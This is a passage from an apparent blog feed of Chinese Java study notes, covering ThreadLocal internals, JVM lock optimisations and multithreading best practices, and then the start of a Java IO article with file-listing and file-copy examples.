Local Storage）"></a>2. 线程本地存储（Thread Local Storage）</h3><p>如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题。</p><p>符合这种特点的应用并不少见，大部分使用消费队列的架构模式（如“生产者-消费者”模式）都会将产品的消费过程尽量在一个线程中消费完。其中最重要的一个应用实例就是经典 Web 交互模型中的“一个请求对应一个服务器线程”（Thread-per-Request）的处理方式，这种处理方式的广泛应用使得很多 Web 服务端应用都可以使用线程本地存储来解决线程安全问题。</p><p>可以使用 java.lang.ThreadLocal 类来实现线程本地存储功能。</p><p>对于以下代码，thread1 中设置 threadLocal 为 1，而 thread2 设置 threadLocal 为 2。过了一段时间之后，thread1 读取 threadLocal 依然是 1，不受 thread2 的影响。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadLocalExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ThreadLocal threadLocal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            threadLocal<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>threadLocal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            threadLocal<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            threadLocal<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            threadLocal<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token number">1</span></code></pre><p>为了理解 ThreadLocal，先看以下代码：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadLocalExample1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ThreadLocal threadLocal1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ThreadLocal threadLocal2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            threadLocal1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            threadLocal2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            threadLocal1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            threadLocal2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>它所对应的底层结构图为：</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/3646544a-cb57-451d-9e03-d3c4f5e4434a.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/3646544a-cb57-451d-9e03-d3c4f5e4434a.png" alt="img"></a></p><p>每个 Thread 都有一个 ThreadLocal.ThreadLocalMap 对象。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */</span>ThreadLocal<span class="token punctuation">.</span>ThreadLocalMap threadLocals <span class="token operator">=</span> null<span class="token punctuation">;</span></code></pre><p>当调用一个 ThreadLocal 的 set(T value) 方法时，先得到当前线程的 ThreadLocalMap 对象，然后将 ThreadLocal-&gt;value 键值对插入到该 Map 中。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span>T value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Thread t <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ThreadLocalMap map <span class="token operator">=</span> <span class="token function">getMap</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>map <span class="token operator">!=</span> null<span class="token punctuation">)</span>        map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">createMap</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>get() 方法类似。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> T <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Thread t <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ThreadLocalMap map <span class="token operator">=</span> <span class="token function">getMap</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>map <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ThreadLocalMap<span class="token punctuation">.</span>Entry e <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">getEntry</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>            T result <span class="token operator">=</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span>e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">setInitialValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ThreadLocal 从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。</p><p>在一些场景 (尤其是使用线程池) 下，由于 ThreadLocal.ThreadLocalMap 的底层数据结构导致 ThreadLocal 有内存泄漏的情况，应该尽可能在每次使用 ThreadLocal 后手动调用 remove()，以避免出现 ThreadLocal 经典的内存泄漏甚至是造成自身业务混乱的风险。</p><h3 id="3-可重入代码（Reentrant-Code）"><a href="#3-可重入代码（Reentrant-Code）" class="headerlink" title="3. 可重入代码（Reentrant Code）"></a>3. 可重入代码（Reentrant Code）</h3><p>这种代码也叫做纯代码（Pure Code），可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身），而在控制权返回后，原来的程序不会出现任何错误。</p><p>可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源、用到的状态量都由参数中传入、不调用非可重入的方法等。</p><h1 id="十二、锁优化"><a href="#十二、锁优化" class="headerlink" title="十二、锁优化"></a>十二、锁优化</h1><p>这里的锁优化主要是指 JVM 对 synchronized 的优化。</p><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>互斥同步进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。</p><p>自旋锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。</p><p>在 JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。</p><h2 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h2><p>锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。</p><p>锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。</p><p>对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">concatString</span><span class="token punctuation">(</span>String s1<span class="token punctuation">,</span> String s2<span class="token punctuation">,</span> String s3<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> s1 <span class="token operator">+</span> s2 <span class="token operator">+</span> s3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">concatString</span><span class="token punctuation">(</span>String s1<span class="token punctuation">,</span> String s2<span class="token punctuation">,</span> String s3<span class="token punctuation">)</span> <span class="token punctuation">{</span>    StringBuffer sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会逃逸到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。</p><h2 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h2><p>如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。</p><p>上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。</p><h2 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h2><p>JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。</p><p>以下是 HotSpot 虚拟机对象头的内存布局，这些数据被称为 Mark Word。其中 tag bits 对应了五个状态，这些状态在右侧的 state 表格中给出。除了 marked for gc 状态，其它四个状态已经在前面介绍过了。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/bb6a49be-00f2-4f27-a0ce-4ed764bc605c.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/bb6a49be-00f2-4f27-a0ce-4ed764bc605c.png" alt="img"></a></p><p>下图左侧是一个线程的虚拟机栈，其中有一部分称为 Lock Record 的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的 Mark Word。而右侧就是一个锁对象，包含了 Mark Word 和其它信息。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/051e436c-0e46-4c59-8f67-52d89d656182.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/051e436c-0e46-4c59-8f67-52d89d656182.png" alt="img"></a></p><p>轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。</p><p>当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程的虚拟机栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/baaa681f-7c52-4198-a5ae-303b9386cf47.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/baaa681f-7c52-4198-a5ae-303b9386cf47.png" alt="img"></a></p><p>如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。</p><h2 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h2><p>偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程在之后获取该锁就不再需要进行同步操作，甚至连 CAS 操作也不再需要。</p><p>当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。</p><p>当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/390c913b-5f31-444f-bbdb-2b88b688e7ce.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/390c913b-5f31-444f-bbdb-2b88b688e7ce.jpg" alt="img"></a></p><h1 id="十三、多线程开发良好的实践"><a href="#十三、多线程开发良好的实践" class="headerlink" title="十三、多线程开发良好的实践"></a>十三、多线程开发良好的实践</h1><ul><li>给线程起个有意义的名字，这样可以方便找 Bug。</li><li>缩小同步范围，从而减少锁争用。例如对于 synchronized，应该尽量使用同步块而不是同步方法。</li><li>多用同步工具少用 wait() 和 notify()。首先，CountDownLatch, CyclicBarrier, Semaphore 和 Exchanger 这些同步类简化了编码操作，而用 wait() 和 notify() 很难实现复杂控制流；其次，这些同步类是由最好的企业编写和维护，在后续的 JDK 中还会不断优化和完善。</li><li>使用 BlockingQueue 实现生产者消费者问题。</li><li>多用并发集合少用同步集合，例如应该使用 ConcurrentHashMap 而不是 Hashtable。</li><li>使用本地变量和不可变类来保证线程安全。</li><li>使用线程池而不是直接创建线程，这是因为创建线程代价很高，线程池可以有效地利用有限的线程来启动任务。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>BruceEckel. Java 编程思想: 第 4 版 [M]. 机械工业出版社, 2007.</li><li>周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011.</li><li><a href="https://docs.oracle.com/javase/specs/jvms/se6/html/Threads.doc.html" target="_blank" rel="noopener">Threads and Locks</a></li><li><a href="http://ifeve.com/thread-signaling/#missed_signal" target="_blank" rel="noopener">线程通信</a></li><li><a href="http://www.importnew.com/12773.html" target="_blank" rel="noopener">Java 线程面试题 Top 50</a></li><li><a href="http://tutorials.jenkov.com/java-util-concurrent/blockingqueue.html" target="_blank" rel="noopener">BlockingQueue</a></li><li><a href="https://stackoverflow.com/questions/11265289/thread-state-java" target="_blank" rel="noopener">thread state java</a></li><li><a href="http://wiki.expertiza.ncsu.edu/index.php/CSC_456_Spring_2012/ch7_MN" target="_blank" rel="noopener">CSC 456 Spring 2012/ch7 MN</a></li><li><a href="https://www.logicbig.com/tutorials/core-java-tutorial/java-multi-threading/happens-before.html" target="_blank" rel="noopener">Java - Understanding Happens-before relationship</a></li><li><a href="https://www.slideshare.net/novathinker/6-thread-synchronization" target="_blank" rel="noopener">6장 Thread Synchronization</a></li><li><a href="https://stackoverflow.com/questions/1202444/how-is-javas-threadlocal-implemented-under-the-hood/15653015" target="_blank" rel="noopener">How is Java’s ThreadLocal implemented under the hood?</a></li><li><a href="https://sites.google.com/site/webdevelopart/21-compile/06-java/javase/concurrent?tmpl=%2Fsystem%2Fapp%2Ftemplates%2Fprint%2F&amp;showPrintDialog=1" target="_blank" rel="noopener">Concurrent</a></li><li><a href="http://www.javacreed.com/java-fork-join-example/" target="_blank" rel="noopener">JAVA FORK JOIN EXAMPLE</a></li><li><a href="http://ifeve.com/talk-concurrency-forkjoin/" target="_blank" rel="noopener">聊聊并发（八）——Fork/Join 框架介绍</a></li><li><a href="http://www.oracle.com/technetwork/java/javase/tech/biasedlocking-oopsla2006-preso-150106.pdf" target="_blank" rel="noopener">Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing</a></li></ul><p>本文转载自: <a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java IO</title>
      <link href="/2018/12/24/java/java-io/"/>
      <url>/2018/12/24/java/java-io/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-IO"><a href="#Java-IO" class="headerlink" title="Java IO"></a>Java IO</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E4%B8%80%E6%A6%82%E8%A7%88">一、概览</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E4%BA%8C%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C">二、磁盘操作</a></li><li>三、字节操作<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6">实现文件复制</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E8%A3%85%E9%A5%B0%E8%80%85%E6%A8%A1%E5%BC%8F">装饰者模式</a></li></ul></li><li>四、字符操作<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81">编码与解码</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#string-%E7%9A%84%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F">String 的编码方式</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#reader-%E4%B8%8E-writer">Reader 与 Writer</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E5%AE%9E%E7%8E%B0%E9%80%90%E8%A1%8C%E8%BE%93%E5%87%BA%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9">实现逐行输出文本文件的内容</a></li></ul></li><li>五、对象操作<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E5%BA%8F%E5%88%97%E5%8C%96">序列化</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#serializable">Serializable</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#transient">transient</a></li></ul></li><li>六、网络操作<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#inetaddress">InetAddress</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#url">URL</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#sockets">Sockets</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#datagram">Datagram</a></li></ul></li><li>七、NIO<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E6%B5%81%E4%B8%8E%E5%9D%97">流与块</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E9%80%9A%E9%81%93%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA">通道与缓冲区</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E7%BC%93%E5%86%B2%E5%8C%BA%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F">缓冲区状态变量</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E6%96%87%E4%BB%B6-nio-%E5%AE%9E%E4%BE%8B">文件 NIO 实例</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E9%80%89%E6%8B%A9%E5%99%A8">选择器</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E5%A5%97%E6%8E%A5%E5%AD%97-nio-%E5%AE%9E%E4%BE%8B">套接字 NIO 实例</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6">内存映射文件</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E5%AF%B9%E6%AF%94">对比</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md#%E5%85%AB%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">八、参考资料</a></li></ul><h1 id="一、概览"><a href="#一、概览" class="headerlink" title="一、概览"></a>一、概览</h1><p>Java 的 I/O 大概可以分成以下几类：</p><ul><li>磁盘操作：File</li><li>字节操作：InputStream 和 OutputStream</li><li>字符操作：Reader 和 Writer</li><li>对象操作：Serializable</li><li>网络操作：Socket</li><li>新的输入/输出：NIO</li></ul><h1 id="二、磁盘操作"><a href="#二、磁盘操作" class="headerlink" title="二、磁盘操作"></a>二、磁盘操作</h1><p>File 类可以用于表示文件和目录的信息，但是它不表示文件的内容。</p><p>递归地列出一个目录下所有文件：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">listAllFiles</span><span class="token punctuation">(</span>File dir<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dir <span class="token operator">==</span> null <span class="token operator">||</span> <span class="token operator">!</span>dir<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dir<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dir<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>File file <span class="token operator">:</span> dir<span class="token punctuation">.</span><span class="token function">listFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">listAllFiles</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>从 Java7 开始，可以使用 Paths 和 Files 代替 File。</p><h1 id="三、字节操作"><a href="#三、字节操作" class="headerlink" title="三、字节操作"></a>三、字节操作</h1><h2 id="实现文件复制"><a href="#实现文件复制" class="headerlink" title="实现文件复制"></a>实现文件复制</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">copyFile</span><span class="token punctuation">(</span>String src<span class="token punctuation">,</span> String dist<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    FileInputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dist<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">20</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// read() 最多读取 buffer.length 个字节</span>    <span class="token comment" spellcheck="true">// 返回的是实际读取的个数</span>    <span class="token comment" spellcheck="true">// 返回 -1 的时候表示读到 eof，即文件尾</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cnt <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buffer<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 